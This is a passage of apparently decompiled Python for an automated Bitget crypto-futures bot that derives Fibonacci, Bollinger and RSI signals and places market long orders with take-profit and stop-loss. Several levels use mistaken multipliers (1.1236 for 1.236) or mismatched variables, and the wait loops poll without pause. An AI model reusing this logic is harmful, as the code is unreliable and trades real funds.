                        tail = df.loc[upper_idx[0], 'high'] - fibo_1000
                    else:  
                        if fibo_value == 0.03:
                            tail = df.loc[upper_idx[0], 'high'] - fibo_0970
                        else:  
                            if fibo_value == 0.05:
                                tail = df.loc[upper_idx[0], 'high'] - fibo_0950
                            else:  
                                if fibo_value == 0.1:
                                    tail = df.loc[upper_idx[0], 'high'] - fibo_0900
                                else:  
                                    if fibo_value == 0.13:
                                        tail = df.loc[upper_idx[0], 'high'] - fibo_0870
                                    else:  
                                        if fibo_value == 0.15:
                                            tail = df.loc[upper_idx[0], 'high'] - fibo_0850
                                        else:  
                                            if fibo_value == 0.18:
                                                tail = df.loc[upper_idx[0], 'high'] - fibo_0820
                                            else:  
                                                if fibo_value == 0.2:
                                                    tail = df.loc[upper_idx[0], 'high'] - fibo_0800
                                                else:  
                                                    if fibo_value == 0.236:
                                                        tail = df.loc[upper_idx[0], 'high'] - fibo_0764
                    if df.loc[upper_idx[0], 'PlusTrue/MinusFalse'] == True:
                        if df.loc[upper_idx[0], 'high'] - df.loc[upper_idx[0], 'close'] >= tail:
                            pass
                        else:  
                            print("Tail_strategy : Short Upper Tail PLUS Candle")
                            fibo_0000 = fibo_0130 = fibo_0236 = fibo_0382 = 0
                            fibo_0500 = fibo_0618 = fibo_0764 = fibo_0870 = 0
                            fibo_1000 = fibo_Minus013 = fibo_1130 = 0
                    else:  
                        if df.loc[upper_idx[0], 'high'] - df.loc[upper_idx[0], 'open'] >= tail:
                            pass
                        else:  
                            print("Tail_strategy : Short Upper Tail MINUS Candle")
                            fibo_0000 = fibo_0130 = fibo_0236 = fibo_0382 = 0
                            fibo_0500 = fibo_0618 = fibo_0764 = fibo_0870 = 0
                            fibo_1000 = fibo_Minus013 = fibo_1130 = 0
                if post_upper_df.empty or (post_upper_df['low'] <= fibo_0618).any() and (not post_upper_df.empty) and (post_upper_df['high'].iloc[(-1)] == fibo_1000 and post_upper_df['low'].iloc[(-1)] <= fibo_0618) and (df['PlusTrue/MinusFalse'].iloc[(-1)] == True):
                    if not (post_upper_df['low'] <= fibo_0618).any() or (post_upper_df['high'].iloc[(-1)] == fibo_1000 and post_upper_df['low'].iloc[(-1)] <= fibo_0618 and (df['PlusTrue/MinusFalse'].iloc[(-1)] == True)):
                        pass
                    else:  
                        print("Nearest candle condition X 1")
                        fibo_0000 = fibo_0130 = fibo_0236 = fibo_0382 = 0
                        fibo_0500 = fibo_0618 = fibo_0764 = fibo_0870 = 0
                        fibo_1000 = fibo_Minus013 = fibo_1130 = 0
                        pass
                else:   
                    print("Nearest candle condition X 2")
                    fibo_0000 = fibo_0130 = fibo_0236 = fibo_0382 = 0
                    fibo_0500 = fibo_0618 = fibo_0764 = fibo_0870 = 0
                    fibo_1000 = fibo_Minus013 = fibo_1130 = 0
                if not post_upper_df.empty and (post_upper_df['high'] > fibo_1000).any():
                    fibo_0000 = fibo_0130 = fibo_0236 = fibo_0382 = 0
                    fibo_0500 = fibo_0618 = fibo_0764 = fibo_0870 = 0
                    fibo_1000 = fibo_Minus013 = fibo_1130 = 0
            else:  
                if low_first == True:
                    if len(lower_idx) > 0:
                        post_lower_df = df.loc[lower_idx[0]:]
                    if diverence_request == True and len(upper_idx) > 0:
                        if diverence_rsi_last - diverence_rsi_first > 0 and fibo_0000 - first_price < 0:
                            div = True
                        else:  
                            if diverence_rsi_last - diverence_rsi_first < 0 and fibo_0000 - first_price > 0:
                                div = True
                            else:  
                                div = False
                    if diverence_request == True:
                        if div == True:
                            pass
                        else:  
                            print("Diverence Check")
                            fibo_0000 = fibo_0130 = fibo_0236 = fibo_0382 = 0
                            fibo_0500 = fibo_0618 = fibo_0764 = fibo_0870 = 0
                            fibo_1000 = fibo_Minus013 = fibo_1130 = 0
                    if oneway_protect == True and len(df) > 0 and (fibo_0500!= 0):
                        latest_upper_band = df.loc[df.index[(-1)], 'Upper_Band']
                        if fibo_0500 > latest_upper_band:
                            print("Oneway_protect")
                            fibo_0000 = fibo_0130 = fibo_0236 = fibo_0382 = 0
                            fibo_0500 = fibo_0618 = fibo_0764 = fibo_0870 = 0
                            fibo_1000 = fibo_Minus013 = fibo_1130 = 0
                    if tail_strategy and len(upper_idx) > 0:
                        if df.loc[upper_idx[0], 'Candle_break_Upperband']:
                            pass
                        else:  
                            print("Not break UpperBand")
                            fibo_0000 = fibo_0130 = fibo_0236 = fibo_0382 = 0
                            fibo_0500 = fibo_0618 = fibo_0764 = fibo_0870 = 0
                            fibo_1000 = fibo_Minus013 = fibo_1130 = 0
                    if len(lower_idx) > 0:
                        if fibo_value == 0:
                            tail = fibo_0000 - df.loc[lower_idx[0], 'low']
                        else:  
                            if fibo_value == 0.03:
                                tail = fibo_0030 - df.loc[lower_idx[0], 'low']
                            else:  
                                if fibo_value == 0.05:
                                    tail = fibo_0050 - df.loc[lower_idx[0], 'low']
                                else:  
                                    if fibo_value == 0.1:
                                        tail = fibo_0100 - df.loc[lower_idx[0], 'low']
                                    else:  
                                        if fibo_value == 0.13:
                                            tail = fibo_0130 - df.loc[lower_idx[0], 'low']
                                        else:  
                                            if fibo_value == 0.15:
                                                tail = fibo_0150 - df.loc[lower_idx[0], 'low']
                                            else:  
                                                if fibo_value == 0.18:
                                                    tail = fibo_0180 - df.loc[lower_idx[0], 'low']
                                                else:  
                                                    if fibo_value == 0.2:
                                                        tail = fibo_0200 - df.loc[lower_idx[0], 'low']
                                                    else:  
                                                        if fibo_value == 0.236:
                                                            tail = fibo_0236 - df.loc[lower_idx[0], 'low']
                        if df.loc[lower_idx[0], 'PlusTrue/MinusFalse'] == True:
                            if df.loc[lower_idx[0], 'open'] - df.loc[lower_idx[0], 'low'] >= tail:
                                pass

                            else:  
                                print("Short Lower Candle Tail PLUS Candle")
                                fibo_0000 = fibo_0130 = fibo_0236 = fibo_0382 = 0
                                fibo_0500 = fibo_0618 = fibo_0764 = fibo_0870 = 0
                                fibo_1000 = fibo_Minus013 = fibo_1130 = 0
                        else:  
                            if df.loc[lower_idx[0], 'close'] - df.loc[lower_idx[0], 'low'] >= tail:
                                pass
                            else:  
                                print("Short Lower Candle Tail Minus Candle")
                                fibo_0000 = fibo_0130 = fibo_0236 = fibo_0382 = 0
                                fibo_0500 = fibo_0618 = fibo_0764 = fibo_0870 = 0
                                fibo_1000 = fibo_Minus013 = fibo_1130 = 0
                    if post_lower_df.empty or not (post_lower_df['high'] >= fibo_0382).any() or (post_lower_df['low'].iloc[(-1)] == fibo_0000 and post_lower_df['high'].iloc[(-1)] >= fibo_0382 and (df['PlusTrue/MinusFalse'].iloc[(-1)] == False)):
                        if not (post_lower_df['high'] >= fibo_0382).any() or (post_lower_df['high'].iloc[(-1)] >= fibo_0382 and df['PlusTrue/MinusFalse'].iloc[(-1)] == False):
                            pass
                        else:  
                            print("Lower Nearest candle condition X 1")
                            fibo_0000 = fibo_0130 = fibo_0236 = fibo_0382 = 0
                            fibo_0500 = fibo_0618 = fibo_0764 = fibo_0870 = 0
                            fibo_1000 = fibo_Minus013 = fibo_1130 = 0
                            pass
                    else:  
                        print("Lower Nearest candle condition X 2")
                        fibo_0000 = fibo_0130 = fibo_0236 = fibo_0382 = 0
                        fibo_0500 = fibo_0618 = fibo_0764 = fibo_0870 = 0
                        fibo_1000 = fibo_Minus013 = fibo_1130 = 0
                    if not post_lower_df.empty and (post_lower_df['low'] < fibo_0000).any():
                        print("Lower Nearest candle condition X 3")
                        fibo_0000 = fibo_0130 = fibo_0236 = fibo_0382 = 0
                        fibo_0500 = fibo_0618 = fibo_0764 = fibo_0870 = 0
                        fibo_1000 = fibo_Minus013 = fibo_1130 = 0
            if chart_fibo_per:
                fibo_0000 = fibo_0130 = fibo_0236 = fibo_0382 = 0
                fibo_0500 = fibo_0618 = fibo_0764 = fibo_0870 = 0
                fibo_1000 = fibo_Minus013 = fibo_1130 = 0
            fibo_error = abs(round(lower_low + 0.03 * (upper_high - lower_low), 1) + trading_error - fibo_0000)
            fibo_error2 = abs(round(lower_low + 0.01 * (upper_high - lower_low), 1) + trading_error - fibo_0000)
            recent_df = df.tail(10)
            recent_high = recent_df['high'].max()
            recent_low = recent_df['low'].min()
            if fibo_0000 > recent_low or fibo_1000 < recent_high:
                leave_bus = True
            else:  
                leave_bus = False
        except Exception as e:
            print('Withhold chart data (not conditions)', e)
            traceback.print_exc()
        return (df, up_first, low_first)
    if not extension:
        df_fif, up, low = add_indicators(df_fiftymin)
    else:  
        df_fif, up, low = add_indicators_extension(df_fiftymin)
    df_recent_10 = df_fif.tail(20)
    
    #print(fibo_0000)
    # llog(fibo_0000)
    # llog(fibo_0500)
    return (df_fiftymin, df_recent_10, up, low)

def add_indicators_extension(df):
    global fibo_1236  
    global fibo_error2  
    global fibo_0013  
    global fibo_0180  
    global fibo_0800  
    global fibo_0030  
    global fibo_0764  
    global fibo_Minus0382  
    global fibo_0100  
    global fibo_error  
    global fibo_1500  
    global fibo_0130  
    global fibo_0000  
    global fibo_Minus0500  
    global fibo_0382  
    global fibo_1000  
    global fibo_0150  
    global fibo_0850  
    global fibo_1618  
    global fibo_Minus013  
    global fibo_0900  
    global fibo_0236  
    global fibo_1130  
    global fibo_0970  
    global fibo_0820  
    global fibo_Minus0236  
    global fibo_0050  
    global fibo_Minus0618  
    global fibo_0500  
    global fibo_1382  
    global fibo_0950  
    global fibo_0870  
    global fibo_0200  
    global fibo_0618  
    try:
        fibo_0000 = fibo_0130 = fibo_0236 = fibo_0382 = fibo_0500 = fibo_0618 = fibo_0764 = fibo_0870 = fibo_1000 = fibo_Minus013 = fibo_1130 = 0
        fibo_0030 = fibo_0050 = fibo_0100 = fibo_0013 = fibo_0150 = fibo_0180 = fibo_0200 = 0
        fibo_0970 = fibo_0950 = fibo_0900 = fibo_0850 = fibo_0820 = fibo_0800 = 0
        fibo_Minus0236 = fibo_Minus0382 = fibo_Minus0500 = fibo_Minus0618 = 0
        upper_high = 0
        lower_low = 0
        up_first = False
        low_first = False
        lower_idx = (-1)
        upper_idx = (-1)
        risk_up_idx = []
        risk_down_idx = []
        elite_up_idx = []
        elite_low_idx = []
        post_lower_df = []
        post_upper_df = []
        up_tail = [0, 0]
        low_tail = [0, 0]
        up_tail_per = 0
        low_tail_per = 0
        chart_fibo_per = False
        diverence_rsi_last = (-1)
        diverence_rsi_first = (-1)
        first_price = (-1)
        tail = 0
        previous_upper_df = pd.DataFrame()
        previous_lower_df = pd.DataFrame()
        recent_lower_df = pd.DataFrame()
        recent_upper_df = pd.DataFrame()
        df['RSI_14'] = ta.rsi(df['close'], length=16)
        df['Middle_Band'] = df['close'].rolling(window=20).mean()
        std_dev = df['close'].rolling(window=20).std()
        df['Upper_Band'] = round(df['Middle_Band'] + std_dev * 2, 1)
        df['Lower_Band'] = round(df['Middle_Band'] - std_dev * 2, 1)
        df['PlusTrue/MinusFalse'] = df['open'] < df['close']
        df['Candle_break_Upperband'] = df['high'] > df['Upper_Band']
        df['Candle_break_Lowerband'] = df['low'] < df['Lower_Band']
        df['Upperband_group'] = (df['Candle_break_Upperband']!= df['Candle_break_Upperband'].shift(1)).cumsum() * df['Candle_break_Upperband']
        df['Lowerband_group'] = (df['Candle_break_Lowerband']!= df['Candle_break_Lowerband'].shift(1)).cumsum() * df['Candle_break_Lowerband']
        upperband_groups = df[df['Upperband_group'] > 0]['Upperband_group'].unique()
        lowerband_groups = df[df['Lowerband_group'] > 0]['Lowerband_group'].unique()
        upperband_first_idx = df[df['Candle_break_Upperband'] == True].index.max() if not df[df['Candle_break_Upperband']].empty else None
        lowerband_first_idx = df[df['Candle_break_Lowerband'] == True].index.max() if not df[df['Candle_break_Lowerband']].empty else None
        if upperband_first_idx is not None and (lowerband_first_idx is None or upperband_first_idx > lowerband_first_idx):
            up_first = True
            if len(upperband_groups) > 0:
                recent_upper_group = upperband_groups[(-1)]
                recent_upper_df = df[df['Upperband_group'] == recent_upper_group]
                if not recent_upper_df.empty:
                    upper_high = recent_upper_df['high'].max()
                    diverence_rsi_last = recent_upper_df['RSI_14'].max()
                if len(upperband_groups) > 1:
                    previous_upper_group = upperband_groups[(-2)]
                    if previous_upper_group is not None:
                        previous_upper_df = df[df['Upperband_group'] == previous_upper_group]
                        if not previous_upper_df.empty and abs(recent_upper_df.index[0] - previous_upper_df.index[(-1)]) <= 5:
                            combined_upper_df = pd.concat([recent_upper_df, previous_upper_df])
                            if not combined_upper_df.empty:
                                upper_high = combined_upper_df['high'].max()
                    diverence_rsi_first = previous_upper_df['RSI_14'].max()
                    if not previous_upper_df.empty:
                        first_price = previous_upper_df['high'].max()
            if len(lowerband_groups) > 0:
                recent_lower_group = lowerband_groups[(-1)]
                recent_lower_df = df[df['Lowerband_group'] == recent_lower_group]
                if not recent_lower_df.empty:
                    lower_low = recent_lower_df['low'].min()
                if len(lowerband_groups) > 1:
                    previous_lower_group = lowerband_groups[(-2)]
                    if previous_lower_group is not None:
                        previous_lower_df = df[df['Lowerband_group'] == previous_lower_group]
                        if not previous_lower_df.empty and abs(recent_lower_df.index[0] - previous_lower_df.index[(-1)]) <= 5:
                            combined_lower_df = pd.concat([recent_lower_df, previous_lower_df])
                            if not combined_lower_df.empty:
                                lower_low = combined_lower_df['low'].min()
            else:  
                lower_low = df['low'].min()
        else:  
            if lowerband_first_idx is not None:
                if upperband_first_idx is None or lowerband_first_idx > upperband_first_idx:
                    low_first = True
                    if len(lowerband_groups) > 0:
                        recent_lower_group = lowerband_groups[(-1)]
                        recent_lower_df = df[df['Lowerband_group'] == recent_lower_group]
                        if not recent_lower_df.empty:
                            lower_low = recent_lower_df['low'].min()
                        diverence_rsi_last = recent_lower_df['RSI_14'].min()
                        if len(lowerband_groups) > 1:
                            previous_lower_group = lowerband_groups[(-2)]
                            if previous_lower_group is not None:
                                previous_lower_df = df[df['Lowerband_group'] == previous_lower_group]
                                if not previous_lower_df.empty and abs(recent_lower_df.index[0] - previous_lower_df.index[(-1)]) <= 5:
                                    combined_lower_df = pd.concat([recent_lower_df, previous_lower_df])
                                    if not combined_lower_df.empty:
                                        lower_low = combined_lower_df['low'].min()
                            diverence_rsi_first = previous_lower_df['RSI_14'].min()
                            if not previous_upper_df.empty:
                                first_price = previous_upper_df['low'].min()
                    if len(upperband_groups) > 0:
                        recent_upper_group = upperband_groups[(-1)]
                        recent_upper_df = df[df['Upperband_group'] == recent_upper_group]
                        if not recent_upper_df.empty:
                            upper_high = recent_upper_df['high'].max()
                        if len(upperband_groups) > 1:
                            previous_upper_group = upperband_groups[(-2)]
                            if previous_upper_group is not None:
                                previous_upper_df = df[df['Upperband_group'] == previous_upper_group]
                                if not previous_upper_df.empty and abs(recent_upper_df.index[0] - previous_upper_df.index[(-1)]) <= 5:
                                    combined_upper_df = pd.concat([recent_upper_df, previous_upper_df])
                                    if not combined_upper_df.empty:
                                        upper_high = combined_upper_df['high'].max()
                    else:  
                        upper_high = df['high'].max()
        if upper_high > lower_low:
            fibo_0000 = round(lower_low, 1) + trading_error
            fibo_0130 = round(lower_low + 0.138 * (upper_high - lower_low), 1) + trading_error
            fibo_0236 = round(lower_low + 0.236 * (upper_high - lower_low), 1) + trading_error
            fibo_0382 = round(lower_low + 0.382 * (upper_high - lower_low), 1) + trading_error
            fibo_0500 = round(lower_low + 0.5 * (upper_high - lower_low), 1) + trading_error
            fibo_0618 = round(lower_low + 0.618 * (upper_high - lower_low), 1) + trading_error
            fibo_0764 = round(lower_low + 0.764 * (upper_high - lower_low), 1) + trading_error
            fibo_0870 = round(lower_low + 0.87 * (upper_high - lower_low), 1) + trading_error
            fibo_1000 = round(upper_high, 1) + trading_error
            fibo_Minus013 = round(lower_low + (-0.135) * (upper_high - lower_low), 1) + trading_error
            fibo_Minus0236 = round(lower_low + (-0.236) * (upper_high - lower_low), 1) + trading_error
            fibo_Minus0382 = round(lower_low + (-0.382) * (upper_high - lower_low), 1) + trading_error
            fibo_Minus0500 = round(lower_low + (-0.5) * (upper_high - lower_low), 1) + trading_error
            fibo_Minus0618 = round(lower_low + (-0.618) * (upper_high - lower_low), 1) + trading_error
            fibo_1130 = round(lower_low + 1.135 * (upper_high - lower_low), 1) + trading_error
            fibo_1236 = round(lower_low + 1.1236 * (upper_high - lower_low), 1) + trading_error
            fibo_1382 = round(lower_low + 1.1382 * (upper_high - lower_low), 1) + trading_error
            fibo_1500 = round(lower_low + 1.15 * (upper_high - lower_low), 1) + trading_error
            fibo_1618 = round(lower_low + 1.1618 * (upper_high - lower_low), 1) + trading_error
            if PRO:
                fibo_0030 = round(lower_low + 0.03 * (upper_high - lower_low), 1) + trading_error
                fibo_0050 = round(lower_low + 0.05 * (upper_high - lower_low), 1) + trading_error
                fibo_0100 = round(lower_low + 0.1 * (upper_high - lower_low), 1) + trading_error
                fibo_0015 = round(lower_low + 0.15 * (upper_high - lower_low), 1) + trading_error
                fibo_0180 = round(lower_low + 0.18 * (upper_high - lower_low), 1) + trading_error
                fibo_0200 = round(lower_low + 0.2 * (upper_high - lower_low), 1) + trading_error
                fibo_0970 = round(lower_low + 0.97 * (upper_high - lower_low), 1) + trading_error
                fibo_0950 = round(lower_low + 0.95 * (upper_high - lower_low), 1) + trading_error
                fibo_0900 = round(lower_low + 0.9 * (upper_high - lower_low), 1) + trading_error
                fibo_0850 = round(lower_low + 0.85 * (upper_high - lower_low), 1) + trading_error
                fibo_0820 = round(lower_low + 0.82 * (upper_high - lower_low), 1) + trading_error
                fibo_0800 = round(lower_low + 0.8 * (upper_high - lower_low), 1) + trading_error
            percentage_change = (fibo_1000 - fibo_0000) / fibo_0000 * 100
            chart_fibo_per = False
        fib_gap = fibo_1000 - fibo_0000
        upper_idx = df[df['high'] == upper_high].index
        lower_idx = df[df['low'] == lower_low].index
        
        print(f"start : {convert_timestamp_to_time(df.loc[df.index[0], 'timestamp'])}")
        print(f"end   : {convert_timestamp_to_time(df.loc[df.index[-1], 'timestamp'])}")
        if len(upper_idx) > 0 :
            print(f"upper : {convert_timestamp_to_time(df.loc[upper_idx[0], 'timestamp'])}")
        if len(lower_idx) > 0 :
            print(f"lower : {convert_timestamp_to_time(df.loc[lower_idx[0], 'timestamp'])}")
        
            
        if up_first:
            if len(upper_idx) > 0:
                post_upper_df = df.loc[upper_idx[0]:]
                if not post_upper_df.empty:
                    if (post_upper_df['low'] <= fibo_0764).any() and (post_upper_df['low'] > fibo_0382).all() and (post_upper_df['low'] > post_upper_df['Lower_Band']).all():
                        pass
                    else:  
                        fibo_0000 = fibo_0130 = fibo_0236 = fibo_0382 = 0
                        fibo_0500 = fibo_0618 = fibo_0764 = fibo_0870 = 0
                        fibo_1000 = fibo_Minus013 = fibo_1130 = 0
                    if df.loc[upper_idx[0], 'low'] <= fibo_0618:
                        fibo_0000 = fibo_0130 = fibo_0236 = fibo_0382 = 0
                        fibo_0500 = fibo_0618 = fibo_0764 = fibo_0870 = 0
                        fibo_1000 = fibo_Minus013 = fibo_1130 = 0
        else:  
            if low_first and len(lower_idx) > 0:
                post_lower_df = df.loc[lower_idx[0]:]
                if not post_lower_df.empty:
                    if (post_lower_df['high'] >= fibo_0236).any() and (post_lower_df['high'] < fibo_0618).all() and (post_lower_df['high'] < post_lower_df['Upper_Band']).all():
                        pass
                    else:  
                        fibo_0000 = fibo_0130 = fibo_0236 = fibo_0382 = 0
                        fibo_0500 = fibo_0618 = fibo_0764 = fibo_0870 = 0
                        fibo_1000 = fibo_Minus013 = fibo_1130 = 0
                    if df.loc[lower_idx[0], 'high'] >= fibo_0382:
                        fibo_0000 = fibo_0130 = fibo_0236 = fibo_0382 = 0
                        fibo_0500 = fibo_0618 = fibo_0764 = fibo_0870 = 0
                        fibo_1000 = fibo_Minus013 = fibo_1130 = 0
        fibo_error = abs(round(lower_low + 0.03 * (upper_high - lower_low), 1) + trading_error - fibo_0000)
        fibo_error2 = abs(round(lower_low + 0.01 * (upper_high - lower_low), 1) + trading_error - fibo_0000)
        recent_df = df.tail(10)
        recent_high = recent_df['high'].max()
        recent_low = recent_df['low'].min()
    except Exception as e:
        print('Withhold chart data (not conditions)', e)
        traceback.print_exc()
    return (df, up_first, low_first)

def analyze_data(bitget, data, up, low):
    try:
        recent_RSI = 0
        positions = []
        positions = bitget.mix_get_single_position(symbol=bitget_symbol, marginCoin='USDT')['data']
        if isinstance(positions, list) and len(positions) > 0 and isinstance(positions[0], dict):
            if 'holdSide' in positions[0]:
                if positions[0]['holdSide'] == 'long' or positions[0]['holdSide'] == 'short':
                    res = 'NIKE AI: Positon is currently in progress. Decision will be made after Positon ends'
                    return res
            print('No Positon data')
        recent_RSI = data['RSI_14'].iloc[(-1)]
        if not extension:
            if up == True and recent_RSI >= short_rsi_value:
                res = 'open short'
                return res
            if low == True and recent_RSI <= long_rsi_value:
                res = 'open long'
                return res
            res = 'stay'
            return res
        if up == True:
            res = 'open long extension'
            return res
        if low == True:
            res = 'open short extension'
            return res
        res = 'stay'
        return res
        return res
    except Exception as e:
        print('Withhold Positon Judgment', e)

def open_long(bitget, trade_size):
    start_time = 0
    formatted_time = 0
    result = 'No orders yet'
    position_data = bitget.mix_get_single_position(symbol=bitget_symbol, marginCoin='USDT')['data']
    try:
        if not isinstance(position_data, list) and leave_bus == True:
            pass
        else:  
            USDT_balance = float(bitget.mix_get_accounts(productType='umcbl')['data'][0]['available'])
            if USDT_balance > 67:
                current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                if fibo_0000 == 0 or fibo_0130 == 0 or fibo_0236 == 0 or (fibo_0382 == 0) or (fibo_0500 == 0) or (fibo_0618 == 0) or (fibo_0382 <= current_price):
                    
                    pass
                else:  
                    if fibo_0500 >= current_price:
                        if Trade_Level['E'] == 1:
                            
                            print('Golden Ratio Long Positon Estimated Entry Zones(0.13%): ' + str(fibo_0130))
                            print('Golden Ratio Long Positon Estimated Profit Zones(0.5%): ' + str(fibo_0500))
                            print('Golden Ratio Long Positon Estimated Loss Zones(0%): ' + str(fibo_0000))

                            current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                            start_time = int(time.time())
                            print('NIKE AI 0.13% Waiting ....')
                            
                            while current_price > fibo_0130 + fibo_error or current_price < fibo_0130 - fibo_error2:
                                current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                elapsed_time = int(time.time()) - start_time
                                if elapsed_time > 900:
                                    print('OverTime... Retry....')
                                    return
                            
                            print('Order in progress...')
                            
                            if TP_excute == True:
                                result = bitget.mix_place_order(symbol=bitget_symbol, side='open_long', orderType='market', size=trade_size, price=fibo_0130, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_0500, presetStopLossPrice=fibo_0000)
                            else:  
                                print('TP Set X')
                                result = bitget.mix_place_order(symbol=bitget_symbol, side='open_long', orderType='market', size=trade_size, price=fibo_0130, marginCoin='USDT', clientOrderId=random_string('buy'), presetStopLossPrice=fibo_0000)
                        else:  
                            if Trade_Level['F'] == 1:
                                print('Golden Ratio Long Positon Estimated Entry Zones(0.13%): ' + str(fibo_0130))
                                print('Golden Ratio Long Positon Estimated Profit Zones(0.618%): ' + str(fibo_0618))
                                print('Golden Ratio Long Positon Estimated Less Zones(0%): ' + str(fibo_0000))
                                
                                current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                print('NIKE AI 0.13% Waiting ....')
                                start_time = time.time()
                                
                                while current_price > fibo_0130 + fibo_error or current_price < fibo_0130 - fibo_error2:
                                    current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                    elapsed_time = int(time.time()) - start_time
                                    if elapsed_time > 900:
                                        print('OverTime.... Retry.....')
                                        return
                                
                                print('Order in progress...')
                                
                                if TP_excute == True:
                                    result = bitget.mix_place_order(symbol=bitget_symbol, side='open_long', orderType='market', size=trade_size, price=fibo_0130, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_0618, presetStopLossPrice=fibo_0000)
                                else:  
                                    print('TP Set X')
                                    result = bitget.mix_place_order(symbol=bitget_symbol, side='open_long', orderType='market', size=trade_size, price=fibo_0130, marginCoin='USDT', clientOrderId=random_string('buy'), presetStopLossPrice=fibo_0000)
                            else:  
                                if Trade_Level['A'] == 1:
                                    
                                    print('Golden Ratio Long Positon Estimated Entry Zones(0.236%): ' + str(fibo_0236))
                                    print('Golden Ratio Long Positon 50% Estimated Profit Zones(0.5%): ' + str(fibo_0500))
                                    print('Golden Ratio Long Positon Estimated Less Zones(0%): ' + str(fibo_0000))
                                        
                                    current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                    print('NIKE AI 0.236% Waiting ....')
                                    start_time = int(time.time())
                                    
                                    while current_price > fibo_0236 + fibo_error or current_price < fibo_0236 - fibo_error2:
                                        current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                        elapsed_time = time.time() - start_time
                                        if elapsed_time > 900:
                                            print('OverTime.... Retry.....')
                                            return
                                    
                                    print('Order in progress...')
                                    
                                    if TP_excute == True:
                                        result = bitget.mix_place_order(symbol=bitget_symbol, side='open_long', orderType='market', size=trade_size, price=fibo_0236, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_0500, presetStopLossPrice=fibo_0000)
                                    else:  
                                        print('TP Set X')
                                        result = bitget.mix_place_order(symbol=bitget_symbol, side='open_long', orderType='market', size=trade_size, price=fibo_0236, marginCoin='USDT', clientOrderId=random_string('buy'), presetStopLossPrice=fibo_0000)
                                else:  
                                    if Trade_Level['B'] == 1:
                                        current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                        print('NIKE AI 0.236% Waiting ....')
                                        
                                        print('Golden Ratio Long Positon Estimated Entry Zones(0.236%): ' + str(fibo_0236))
                                        print('Golden Ratio Long Positon Estimated Profit Zones(0.618%): ' + str(fibo_0618))
                                        print('Golden Ratio Long Positon Estimated Less Zones(0%): ' + str(fibo_0000))
                                            
                                        start_time = int(time.time())
                                        
                                        while current_price > fibo_0236 + fibo_error or current_price < fibo_0236 - fibo_error2:
                                            current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                            elapsed_time = int(time.time()) - start_time
                                            if elapsed_time > 900:
                                                print('OverTime.... Retry.....')
                                                return
                                        
                                        print('Order in progress...')
                                        
                                        if TP_excute == True:
                                            result = bitget.mix_place_order(symbol=bitget_symbol, side='open_long', orderType='market', size=trade_size, price=fibo_0236, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_0618, presetStopLossPrice=fibo_0000)
                                        else:  
                                            print('TP Set X')
                                            result = bitget.mix_place_order(symbol=bitget_symbol, side='open_long', orderType='market', size=trade_size, price=fibo_0236, marginCoin='USDT', clientOrderId=random_string('buy'), presetStopLossPrice=fibo_0000)
                                    else:  
                                        if Trade_Level['G'] == 1:
                                            
                                            current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                            print('NIKE AI 0.13% Waiting ....')
                                            print('Golden Ratio Long Positon Estimated Entry Zones(0.13%): ' + str(fibo_0130))
                                            print('Golden Ratio Long Positon Estimated Profit Zones(0.5%): ' + str(fibo_0500))
                                            print('Golden Ratio Long Positon Estimated Less Zones(-0.13%): ' + str(fibo_Minus013))
                                            start_time = int(time.time())
                                            
                                            while current_price > fibo_0130 + fibo_error or current_price < fibo_0130 - fibo_error2:
                                                current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                elapsed_time = int(time.time()) - start_time
                                                if elapsed_time > 900:
                                                    print('OverTime.... Retry.....')
                                                    return
                                            
                                            print('Order in progress...')
                                            
                                            if TP_excute == True:
                                                result = bitget.mix_place_order(symbol=bitget_symbol, side='open_long', orderType='market', size=trade_size, price=fibo_0130, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_0500, presetStopLossPrice=fibo_Minus013)
                                            else:  
                                                print('TP Set X')
                                                result = bitget.mix_place_order(symbol=bitget_symbol, side='open_long', orderType='market', size=trade_size, price=fibo_0130, marginCoin='USDT', clientOrderId=random_string('buy'), presetStopLossPrice=fibo_Minus013)
                                        else:  
                                            if Trade_Level['H'] == 1:
                                                current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                print('NIKE AI 0.13% Waiting ....')
                                                
                                                print('Golden Ratio Long Positon Estimated Entry Zones(0.13%): ' + str(fibo_0130))
                                                print('Golden Ratio Long Positon Estimated Profit Zones(0.618%): ' + str(fibo_0618))
                                                print('Golden Ratio Long Positon Estimated Less Zones(-0.13%): ' + str(fibo_Minus013))
                                                start_time = int(time.time())
                                                
                                                while current_price > fibo_0130 + fibo_error or current_price < fibo_0130 - fibo_error2:
                                                    current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                    elapsed_time = int(time.time()) - start_time
                                                    if elapsed_time > 900:
                                                        print('OverTime.... Retry.....')
                                                        return
                                                
                                                print('Order in progress...')
                                                
                                                if TP_excute == True:
                                                    result = bitget.mix_place_order(symbol=bitget_symbol, side='open_long', orderType='market', size=trade_size, price=fibo_0130, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_0618, presetStopLossPrice=fibo_Minus013)
                                                else:  
                                                    print('TP Set X')
                                                    result = bitget.mix_place_order(symbol=bitget_symbol, side='open_long', orderType='market', size=trade_size, price=fibo_0130, marginCoin='USDT', clientOrderId=random_string('buy'), presetStopLossPrice=fibo_Minus013)
                                            else:  
                                                if Trade_Level['C'] == 1:
                                                    current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
